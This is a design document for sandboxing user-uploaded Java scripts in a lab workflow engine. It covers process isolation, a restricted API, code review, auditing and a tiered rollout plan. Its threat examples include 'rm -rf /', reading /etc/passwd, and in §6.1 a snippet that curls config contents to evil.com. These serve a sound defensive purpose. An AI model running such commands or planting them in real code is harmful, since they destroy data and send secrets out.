# Custom Script Node — Design

> **English edition.** The Chinese original is [`docs/自定义脚本节点-设计.md`](../自定义脚本节点-设计.md); this is
> a line-for-line translation. Numbers, commit hashes and file paths are identical to
> the Chinese source — if they ever disagree, the Chinese original wins.

> **Requirement**: a certain node needs a piece of Java code that reads the program
> state, does some processing and puts the result into a variable, which the rest of the
> workflow then uses.
>
> **Risk**: the uploaded code can delete the database, send network requests and exhaust
> the process. **This is the highest-risk feature in the whole system**, so it has to be
> designed as a sandbox.

---

## 1. What this feature can do

### 1.1 Typical scenarios

| Scenario | What the code does |
|---|---|
| **Computing a position dynamically** | Query which shelf levels are free and compute which one to use next |
| **Routing by business rules** | Decide which branch to take based on the sample type and the priority |
| **Data transformation** | Extract a complex structure from the JSON the device returned |
| **Integrating with an external system** | Query LIMS to get the sample information (**this is the most dangerous**) |
| **Complex conditions** | A judgement combining a dozen variables, which an expression cannot express |

### 1.2 Why an expression is not enough

**An expression can only "compute one value", it cannot "look things up"**:

```
Expression: ${a + b}                  ✅ it can compute
Expression: ${lookupFreeSlots}         ❌ it cannot query
Expression: ${callLimsApi}             ❌ it cannot call
```

**The script node is exactly what fills this gap.**

---

## 2. The security boundary (the **most critical part**)

### 2.1 A comparison of the four levels

| Option | Safety | Flexibility | Effort |
|---|---|---|---|
| **A. Execute the uploaded .java directly in the main process** | ❌ **Very low** | Extremely high | Small |
| **B. Classloader isolation** | 🟡 Low (it can be bypassed by reflection) | Extremely high | Medium |
| **C. A separate process + a restricted API** ⭐ | 🟡 **Medium** | High | **Medium** |
| **D. Only pre-installed plugins + configuration are allowed** | ✅ High | Low | Small |

**Choose C** (a separate process):

```java
// The user code only sees ScriptContext, and no system class at all
public class MyScript implements StepScript {
    public Map<String, Object> run(ScriptContext ctx) {
        String plate = ctx.var("plateId");           // read a variable
        int count = ctx.varInt("plateCount");
        List<String> free = ctx.freeSlots("ID1183"); // restricted query
        return Map.of("nextSlot", free.get(0));      // return a new variable
    }
}
```

### 2.2 Why a "separate process" is necessary

**Inside the same JVM, any "sandbox" can be bypassed**:

| Bypass | Example |
|---|---|
| `System.exit(0)` | It kills the control console directly |
| `Runtime.exec("rm -rf /")` | It executes a system command |
| `Thread.sleep(Long.MAX)` | It hangs the thread |
| `new byte[2_000_000_000]` | OOM |
| Reflection `Class.forName("com.labos...")` | It reaches internal classes |
| `SecurityManager` | **Deprecated in JDK 17, removed in JDK 21** |

**Only process isolation can hold these back** (at least it can kill it).

### 2.3 The concrete sandbox measures

| Measure | How it is done |
|---|---|
| **A separate process** | `java -cp user-scripts.jar`, it does not inherit the main process classpath |
| **A restricted API** | The child process only loads `labos-script-api.jar` (a few dozen methods) |
| **Timeout** | The main process calls `Process.destroyForcibly()` after 5 seconds |
| **Memory limit** | `-Xmx256m` |
| **CPU limit** | `-XX:ActiveProcessorCount=1` |
| **No network** | **No network library is loaded** when the child process starts (the API jar has none) |
| **No database** | There is no JDBC in the API jar |
| **Working directory isolation** | The cwd of the child process points at a temporary directory; it cannot read the project files |
| **Audit** | Every execution records: who, which code, how long, the return value |

### 2.4 What the restricted API can do

**Only this** (`labos-script-api`):

```java
public interface ScriptContext {
    // read variables
    String var(String name);
    int varInt(String name);
    double varDouble(String name);
    boolean varBool(String name);

    // read-only queries (it does not connect to the database itself; the main process
    // looks it up on its behalf and passes it in)
    List<String> freeSlots(String deviceCode);      // which positions are free
    String deviceStatus(String deviceCode);         // idle/running/fault
    Instant now();

    // logging (it goes into run_event)
    void log(String msg);
}
```

**Deliberately not provided**:

| Not provided | Why |
|---|---|
| A database connection | It could delete the database |
| An HTTP client | It could exfiltrate data |
| File read/write | It could read the keys |
| Threads/timers | It could hang |
| A reflection entry point | It could bypass the restrictions |

**What if it has to query an external system**: **the main process looks it up on its
behalf**.

```java
// the user code
String sample = ctx.fetchExternal("LIMS", "sample/" + sampleId);
```

**The main process implements it**:

```java
// only the whitelisted "external data sources" are allowed
Map<String, ExternalDataSource> allowed = Map.of(
    "LIMS", limsClient   // configured beforehand, with credentials and a timeout
);
```

**The user code can only "request"; it cannot "send the request itself".**

---

## 3. The node model

### 3.1 Its use in a workflow

```json
{
  "nodeType": "script",
  "name": "Compute the next free slot",
  "scriptId": "calc-next-slot",
  "version": 3,
  "inputs": ["plateId", "deviceCode"],
  "outputs": ["nextSlot"],          // declares which variables are produced
  "timeoutMs": 5000
}
```

**`scriptId` + `version`** — the code is **versioned**, not inlined in the workflow.

### 3.2 Why versioning instead of inlining

| Inline | Versioned |
|---|---|
| A large block of code is stuffed into the workflow JSON | The code is stored separately and the workflow only references it |
| Changing the code means changing the workflow | Changing the code is independent; the workflow does not change |
| It cannot be audited | Every execution knows which version was used |
| 10 workflows using the same code have to copy it 10 times | They all reference the same one |

### 3.3 The table structure

```sql
CREATE TABLE script (
    id            bigserial PRIMARY KEY,
    tenant_id     bigint NOT NULL,
    code          varchar(64) NOT NULL,        -- 'calc-next-slot'
    name          varchar(128) NOT NULL,
    language      varchar(16) NOT NULL DEFAULT 'java',
    source        text NOT NULL,               -- the complete source code
    compiled_jar  bytea,                       -- the compilation output (optional)
    status        varchar(16) NOT NULL DEFAULT 'draft',
                  -- draft | pending_review | active | disabled
    version       integer NOT NULL DEFAULT 1,
    reviewed_by   bigint,
    reviewed_at   timestamptz,
    created_by    bigint,
    created_at    timestamptz NOT NULL DEFAULT now(),
    UNIQUE (tenant_id, code, version)
);

CREATE TABLE script_execution (
    id            bigserial PRIMARY KEY,
    tenant_id     bigint NOT NULL,
    script_id     bigint NOT NULL,
    version       integer NOT NULL,
    run_id        bigint,
    node_id       bigint,
    input_vars    jsonb,
    output_vars   jsonb,
    ok            boolean NOT NULL,
    error         text,
    duration_ms   integer,
    exit_code     integer,
    created_at    timestamptz NOT NULL DEFAULT now()
);

COMMENT ON TABLE script_execution IS
    'The audit record of each script execution: who ran which version, the input and output, the elapsed time and the exit code';
```

### 3.4 The state transitions

```
draft ──submit──> pending_review ──approved──> active ──disable──> disabled
                    │
                    └──rejected──> draft
```

**Only `active` can be referenced by a workflow** — **the code of a draft cannot run in
production**.

---

## 4. The execution flow

### 4.1 On the main-process side

```java
Map<String, Object> runScript(long scriptId, int version,
                              Map<String, Object> inputs) throws Exception {
    Script s = loadScript(scriptId, version);
    if (!"active".equals(s.status())) {
        throw new IllegalStateException("脚本不是 active 状态，不能执行");
    }

    // ① prepare a temporary directory
    Path tmp = Files.createTempDirectory("labos-script-");

    // ② write the input (JSON)
    Files.writeString(tmp.resolve("input.json"), toJson(inputs));

    // ③ start the child process
    ProcessBuilder pb = new ProcessBuilder(
        "java",
        "-Xmx256m", "-XX:ActiveProcessorCount=1",
        "-cp", "/opt/labos/script-runtime/labos-script-api.jar:"
              + "/opt/labos/scripts/" + s.code() + "-v" + version + ".jar",
        "com.labos.script.Runner",
        tmp.toString()
    );
    pb.directory(tmp.toFile());
    pb.redirectErrorStream(true);
    Process p = pb.start();

    // ④ kill on timeout
    if (!p.waitFor(5, TimeUnit.SECONDS)) {
        p.destroyForcibly();
        throw new ScriptTimeout("脚本执行超过 5 秒");
    }

    // ⑤ read the result
    String out = Files.readString(tmp.resolve("output.json"));
    return fromJson(out);
}
```

### 4.2 On the child-process side (provided by `labos-script-api`)

```java
public final class Runner {
    public static void main(String[] args) throws Exception {
        Path dir = Path.of(args[0]);

        // ① read the input
        Map<String, Object> input = readJson(dir.resolve("input.json"));

        // ② load the user class
        StepScript script = loadUserScript();
        ScriptContext ctx = new ContextImpl(input, dir);

        // ③ execute
        Map<String, Object> output;
        try {
            output = script.run(ctx);
        } catch (Throwable t) {
            writeJson(dir.resolve("error.json"),
                Map.of("message", t.toString()));
            System.exit(1);
            return;
        }

        // ④ write the result
        writeJson(dir.resolve("output.json"), output);
        System.exit(0);
    }
}
```

### 4.3 Why files instead of stdin/stdout

| Approach | Advantage | Disadvantage |
|---|---|---|
| **Files** ⭐ | Simple, debuggable (a human can read it), no encoding problems | There is disk IO |
| stdin/stdout | No IO | The user code `System.out.println` pollutes the protocol |
| Unix socket | Bidirectional | Complex |

**Choose files** — and **the output file is placed in the temporary directory**, so the
user code can only write into its own directory.

---

## 5. The list of security risks (every item has to be handled)

### 5.1 The "bad things" the user code can do

| # | Bad thing | How the sandbox stops it | Residual risk |
|---|---|---|---|
| 1 | `System.exit(0)` | Only the child process is killed | ✅ None |
| 2 | `Runtime.exec("rm -rf /")` | **Cannot be stopped** (the child process has the system permissions) | 🔴 **High** |
| 3 | An infinite loop | Killed after 5 seconds | ✅ None |
| 4 | `new byte[2GB]` | `-Xmx256m` | ✅ None |
| 5 | Reading `/etc/passwd` | **Cannot be stopped** (the file system permissions) | 🟠 Medium |
| 6 | Connecting to the database | The API jar has no JDBC | ✅ None |
| 7 | Sending HTTP | The API jar has no network library | ✅ None |
| 8 | Writing project files | The cwd is a temporary directory, but it **can write absolute paths** | 🟠 Medium |

### 5.2 The two that cannot be stopped, and what to do about them

**#2 `Runtime.exec`, #5 reading files and #8 writing files** — **a process-level sandbox
cannot stop them; it needs the OS**:

| Measure | Platform | Effect |
|---|---|---|
| **A separate system user** (`labos-script`) | Linux | It can only read its own directory |
| **A read-only mount** | Docker | The project directory is read-only |
| **`ulimit`** | Linux | It limits the number of open files and processes |
| **SELinux/AppArmor** | Linux | Mandatory access control |

**Windows**: a low-privilege user + file ACLs.

**macOS** (the development environment): `sandbox-exec` (deprecated but still usable) or
simply accepting the risk.

### 5.3 The realistic approach

**Enable it by tier**:

| Environment | Script feature |
|---|---|
| **Development / demo** | Enabled, the risk is accepted (there is no real data) |
| **Test** | Enabled, a separate user |
| **Production** | **Off by default**, an administrator has to enable it explicitly + review it |

```json
"lab_profile": {
  "script": {
    "enabled": false,              // off by default in production
    "requireApproval": true,       // an approval is mandatory
    "timeoutMs": 5000,
    "maxMemoryMb": 256,
    "allowedExternalSources": ["LIMS"]   // the whitelist
  }
}
```

---

## 6. The review and the audit

### 6.1 The review before going live

```
① The developer writes the script → draft
② It is submitted for review → pending_review
③ The administrator reads the source code (the key point: **a human has to read the code**)
④ It is approved → active
```

**Why a human has to look at it**:

```java
// This code looks like it is computing a position
public Map<String, Object> run(ScriptContext ctx) {
    ctx.log("calculating...");
    Runtime.getRuntime().exec("curl evil.com/$(cat /opt/labos/config.json)");
    return Map.of("slot", "L1");
}
```

**Any static analysis may miss something; only a human reading the source code is
reliable.**

### 6.2 The audit at runtime

The `script_execution` table records:

| Field | Purpose |
|---|---|
| `script_id` + `version` | Which version |
| `run_id` + `node_id` | Which node of which run |
| `input_vars` / `output_vars` | The input and output (to make it reproducible) |
| `duration_ms` / `exit_code` | The performance and the reason for the failure |

**The query**:

```sql
-- the most recent 100 executions of a given script
SELECT run_id, ok, duration_ms, error
FROM script_execution WHERE script_id = 12
ORDER BY created_at DESC LIMIT 100;
```

### 6.3 The detection of abnormal behaviour

| Feature | Possible problem |
|---|---|
| The execution time approaches 5 seconds | Somebody wrote an infinite loop |
| Frequent timeouts | The same |
| An abnormal number of output variables | An attempt to pollute the context |
| An undeclared `outputs` was accessed | **Reject it and raise an alert** |

**The fourth item has to be enforced**: a variable returned by the script **must have been
declared in `outputs`**, otherwise there is an error — this prevents a script from
quietly modifying other variables.

---

## 7. The relationship to expressions

| Capability | Expression | Script |
|---|---|---|
| Arithmetic | ✅ | ✅ |
| Conditionals | ✅ | ✅ |
| **Querying the state** (which positions are free) | ❌ | ✅ |
| **Calling an external system** | ❌ | ✅ (with a whitelist) |
| **Complex logic** | ❌ | ✅ |
| Safety | ✅ High | 🟡 Medium |
| Performance | Microseconds | **Tens to hundreds of milliseconds** (starting a process) |

**The recommended order**:

```
Whatever an expression can solve, prefer the expression (safe, fast)
Only when an expression cannot express it, use a script
```

**The decision criterion**:

| Requirement | What to use |
|---|---|
| `${a + 1}` | An expression |
| `${lookupFreeSlots}` | **A script** |
| `${callLims}` | **A script** |

---

## 8. The implementation tiers

### L1 (do it now): the expression engine

**2.5 days**, already in the M1 plan.

### L2 (do it when there is demand): the script node

| Task | Estimate |
|---|---|
| `labos-script-api` (the interface + the Runner) | 2 days |
| The main-process executor (process management + timeout + the file protocol) | 3 days |
| The `script` / `script_execution` tables | 1 day |
| The compilation service (upload .java → compile it into a jar) | 2 days |
| The review process (draft → active) | 2 days |
| The frontend (the code editor + versions + the review) | 5 days |
| **Total** | **3 weeks** |

**Recommendation**: **do L1 first; wait for L2 until there is a clear requirement**.

**The reasons**:
- **L2 has the highest risk** (arbitrary code execution)
- **The effort is 8 times that of L1**
- **Most "dynamic" requirements are covered by an expression + a loop**

---

## 9. If it really has to be done now (the minimum viable version)

**It still works without these**:

| Cut | Impact |
|---|---|
| The compilation service (only pre-compiled jars are accepted) | The developer compiles and uploads it themselves |
| The frontend editor (upload via the API) | A poor experience, but it works |
| Version management (only `latest`) | No rollback |
| The review process (straight to active) | **High risk, only suitable for a development environment** |

**The minimum version: 2 weeks** (upload a jar via the API + execute it in a separate
process + the audit table).

**But skipping the review process is not recommended in production.**

---

## 10. Open questions

| # | Question | Impact |
|---|---|---|
| 1 | Does the script have to **query an external system** (LIMS/ERP)? | If so, a "whitelisted lookup on its behalf" has to be built |
| 2 | Does production **allow uploading code**? | If not, only build the expression engine |
| 3 | Who reviews the code? | If nobody reviews it, do not enable the feature |
| 4 | Does the script execution have to **fit within a few tens of milliseconds**, or is a few hundred milliseconds acceptable? | Starting the JVM takes 200-500 ms, and frequent calls affect the throughput |

**The fourth point needs attention**: starting the JVM takes **200-500 milliseconds** each
time. If a workflow has 10 script nodes, the startup alone costs 2-5 seconds.

**Optimisation**: **a resident script process pool** (start once, reuse) — but that lowers
the isolation again.

**Trade-off**: isolation vs performance.

---

## 11. The ruling of 2026-11-05: Java first, Python second; upload a script and reference it

> This section records the target approach given by the user side. It conflicts with the
> existing security trade-off in §2, so every conflict is named explicitly.

**The approach of the user side (the gist of their words)**:

1. They used to do it in Java — calling Java classes directly, so as to obtain **the
   attributes of the experiment that is currently being run**, look up results and process
   them, in order to control the workflow more finely.
2. **Java first, Python second**.
3. A Java script is **uploaded first**, then the node **references the script** and runs it.
4. They welcome a discussion of better ways, and want the public implementation methods
   recorded as well.

**The conflicts with the existing design (they have to be named, not skirted)**:

| The user side's approach | The existing trade-off in §2 | The conflict |
|---|---|---|
| Calling Java classes directly to obtain the experiment attributes | §2.2: inside one JVM any sandbox can be bypassed | **Calling internal classes in-process is option A/B of §2**; `ConditionEvaluator.java:8-11` explicitly rejected that option |
| Executing after uploading | §2.3: a separate process plus a restricted API | The two do not conflict, but "where the uploaded code runs" has to be stated first |
| Java first, Python second | — | The language and the sandbox are orthogonal: Java can run in-process or out of process, while Python can only run out of process |

**The single most important sentence**: "**be able to read the experiment attributes with
plain Java classes**" and "**execute after uploading the code**" are **two different
things**, and they can be split apart — the former is built as a **compile-time plugin**
(no sandbox needed), and only the latter needs a separate-process sandbox. §13 gives a
three-tier ladder on that basis.

---

## 12. The public implementation methods (a survey, 2026-11-05)

| Product | How it is done | Language | The sandbox boundary | What this project can borrow |
|---|---|---|---|---|
| Camunda 8 Script Task | A built-in **FEEL** engine; running another language goes through a **job worker** (an external process the user implements) | FEEL / custom | Built into the engine (FEEL has no side effects) | The layering of "the built-in expressiveness is limited, so move complex logic out" |
| Camunda 7 **Script Connector** | A **JSR-223** engine registration framework (JS/Kotlin/Groovy + SPI extensions) | Multiple | **None** (the same JVM) | Languages are pluggable; but this project does not adopt the same-JVM option |
| Flowable | A **JSR-223** scripting API that exposes a `flw` context object | Multiple | None (the same JVM) | The API shape of "a context object plus a restricted facade" |
| n8n **Function Node** | Runs inside a **V8 isolate** sandbox (memory and CPU capped, no file system, no network) | JavaScript | A V8 isolate (a capability sandbox) | Hard isolation with the language built in; the price is that only JS works |
| n8n **Code Node (Python)** | Starts a **separate child process** | Python | A process plus a container | Identical to this project's "file protocol + child process" in §4 |
| General sandbox boundaries | **WASM** (no syscall by default) / **gVisor** (a user-space kernel intercepts syscalls) / **microVM** (Firecracker, about 125 ms and about 5 MB per VM) | Any | WASM / syscall interception / hardware virtualisation | The three choices for production-grade hard isolation |
| GraalVM | `Context` plus **`SandboxPolicy.ISOLATED`** (a separate heap, a separate VM) | JS/Python/Ruby … | GraalVM ISOLATED | If multi-language in one process is insisted on, this is the only respectable tier |
| **The runtime fact** | **Nashorn was removed in JDK 15 by JEP 372** (deprecated since JDK 11 by JEP 335); the replacements are GraalJS / GraalPy | — | — | **On JDK 17 there is no built-in scripting engine at all** |

**The conclusion**:

- The "**run user scripts in the same JVM**" tier is **not taken** by this project: JDK 17 has no built-in engine (Nashorn is gone), and pulling in GraalJS/Jython amounts to handing out `ScriptEngine`, which directly conflicts with the trade-off in `ConditionEvaluator.java:8-11`.
- Among the public products, the "zero-risk" approaches are only two kinds: **pre-installed plugins + an external worker** (a Camunda 7 custom Connector can be written this way too), or **a hard sandbox** (a V8 isolate / WASM / a microVM).
- This project takes **the former** first (§13 T1), and when arbitrary uploaded code is really needed it adds **a lightweight version of the latter** (a separate JVM child process, §13 T2).

---

## 13. The recommendation: a three-tier ladder (T1 compiled in / T2 uploaded sandbox / T3 external service)

**The core recommendation: split the user side's two things into three tiers. The first
tier needs no sandbox, yet it is exactly what delivers the "call Java classes directly"
experience.**

| Tier | Shape | Where the code comes from | Isolation | Can it use Java classes | Startup cost | When it fits |
|---|---|---|---|---|---|---|
| **T1 A registered Java step** ⭐ | A class implementing `StepScript` is **compiled and packaged together with the kernel**; a node only references a `code` | The developer submits a PR and goes through ordinary code review | None (in process, but the code itself is trusted) | ✅ the full power of Java | 0 (an in-process call) | **Java first**, the starting point of this project |
| **T2 An uploaded sandboxed script** | Upload a `.java` → compile it into a jar → run it in a **separate JVM child process** | Uploaded from the page | A process plus a restricted API plus timeout/memory/CPU | 🟡 only `labos-script-api` | 200–500 ms per call | When "change the logic without shipping a release" is needed |
| **T3 An external algorithm service** | The kernel makes an **HTTP call** to an external service that implements it | Deployed separately | A network boundary | ✅ anything | one RPC | Many dependencies, heavy computation, an existing service |

**Why T1 is "the better way"**:

- What the user side wants is "**the script can call Java classes directly and read the experiment attributes**". The essence of that is **the code is trusted and has the same lifecycle as the kernel** — so there is no such word as "upload"; the code was always in the repository.
- T1 needs no sandbox, no compilation service and no approval process (it goes through ordinary PR review), so **both the effort and the risk are far below L2 in §8**.
- T1 and T2 share **exactly the same node model and context protocol**: upgrading to "upload from the page" later only changes `code` from resolving in a "compile-time registry" to resolving to a "runtime jar", while `StepScriptContext` stays the same.

**The node model of T1** (following §3.1, with versioning and approval removed):

```json
{
  "nodeType": "scriptTask",
  "name": "Compute the next free slot",
  "protocolName": "__script",
  "method_params": {
    "code": "calc_next_slot",
    "inputs": ["plateId", "deviceCode"],
    "outputs": ["nextSlot"],
    "timeoutMs": 500
  }
}
```

**The registry of T1** (compile time, written in the code):

```java
// The code is trusted: compiled, reviewed and released together with the kernel
StepScriptRegistry.register("calc_next_slot", (ctx) -> {
    String plate = ctx.var("plateId");
    List<String> free = ctx.freeSlots(ctx.var("deviceCode"));
    return Map.of("nextSlot", free.get(0));
});
```

**The only difference between T2 and T1**: `code` goes from "a registry" to "a jar file", and execution goes from "an in-process call" to "start a child process plus the file protocol" (§4). **The node XML and the variable protocol do not change** — that is the most important payoff of this design: **doing T1 first wastes nothing.**

---

## 14. How the script obtains the experiment context (the landing point in this project)

**The status quo (hard facts)**:

| Fact | Location | Impact |
|---|---|---|
| The constructor parameters of `GraphRunner` contain **no** `runId` / `workflowId` / `experimentId` / `tenantId` | `GraphRunner.java:210-237` | The runner itself cannot tell which run it is executing |
| The runtime variables are a `Map<String, String>` — **the values can only be String** — and they are **in-memory state for a single run** | `GraphRunner.java:93` | The script output has to be **flattened** into String→String |
| The assembly point for the context is `WorkflowService`: it holds `runId` and injects the variables and the output reader in the same place | `WorkflowService.java:746,811-824` | **This is the right place to inject a `ScriptContext`** |
| `scriptTask` is already in the parser whitelist | `WorkflowGraphParser.java:194` | The node can enter the graph, so **the parser does not have to change** |
| The built-in dispatch only recognises `__setVar` / `__expr` and throws for anything else | `GraphRunner.java:442-461` | Adding one `__script` branch connects it up |
| A `protocolName` starting with `__` → `Kind.BUILTIN` (no device lookup, no driver) | `WorkflowGraphParser.java:172-174` | `protocolName="__script"` naturally lands in the built-in channel |

**The context snapshot (read-only, limited, auditable)** — assembled by `WorkflowService` and handed to the script:

```java
// Assembled by WorkflowService (it holds runId)
public interface ScriptContext {
    String var(String name);                  // a runtime variable (a read-only snapshot)
    Map<String, String> vars();               // all the variables
    long runId();                             // the current run (for the audit)
    String nodeKey();                         // the current node
    String experimentId();                    // the current experiment (may be empty)
    List<String> freeSlots(String deviceCode); // a controlled query (looked up by the kernel)
    String deviceStatus(String deviceCode);   // a controlled query (looked up by the kernel)
    void log(String msg);                     // it goes into run_event
}
```

**Why the script is not given a direct database connection**: §2.4 already settled it — "**the user code can only request; it cannot send the request itself**". `freeSlots` / `deviceStatus` are looked up by the kernel and passed in; the script only sees the result.

**The hard constraint on writing variables back**: `variables` is a `Map<String, String>` (`GraphRunner.java:93`).

| The value the script returns | How it is written back | Result |
|---|---|---|
| `{"nextSlot": "L3"}` | used directly | ✅ |
| `{"scores": {"A": 1, "B": 2}}` | it **must** be serialised into a string (such as `{"A":1,"B":2}`) | 🟡 a later expression can only compare it as a string |
| an attempt to write a variable that was not declared in `outputs` | rejected with an error | ❌ (§6.3 item 4) |

**Supporting "structured variables" would mean changing the runtime type** — that is a
separate piece of work (`Map<String,String>` → `Map<String,Object>`), and it ripples into
`ConditionEvaluator` and `substitute()`. **The recommendation is not to do it in this
phase**; keep the script output flat.

---

## 15. Phasing and acceptance

| Phase | Content | The acceptance entry point | The gate |
|---|---|---|---|
| **T1-a** | The `StepScript` / `ScriptContext` interfaces + `StepScriptRegistry` + an `__script` branch in `GraphRunner.executeBuiltin` | `GraphRunnerTest` gains `caseScriptRegistry` (register one script, run `S → a device → the script → E`, assert the variable was written) | `MIN_PURE` |
| **T1-b** | `WorkflowService` assembles and injects the snapshot (`freeSlots` / `deviceStatus` looked up by the kernel) | 2 more cases in the `builtin` section of `verify-flow-matrix.py` (the script writes a variable → the condition takes the right branch) | `MIN_CHAIN` |
| **T1-c** | The designer: a right-hand panel for `__script` (choose `code`, declare `inputs`/`outputs`, the timeout) | 1 more case in section E of `e2e-flow-matrix.py` (the panel can be filled in and it persists) | `MIN_E2EFM` |
| **T2** | Upload → compile → execute in a separate process (§4) | A new `verify-script-sandbox.py`: a timeout is killed / an undeclared `outputs` is rejected / the audit lands in `script_execution` | a new `MIN_SCRIPT` |
| **T3** | An external algorithm service (HTTP) | To be decided by demand | — |

**Number discipline**: every added assertion has to be mirrored into the `MIN_*` values of
`scripts/ci-gate.sh`, into `docs/测试用例总表.md` and into `ROADMAP.md`, and **the thresholds
only ever go up** (the convention already in force in this document's directory).

**Out of scope for this phase**: the OS-level isolation of `Runtime.exec` and of reading
and writing absolute paths (§5.2), the `Map<String,String>` structured-variable rework, and
the approval-process UI.

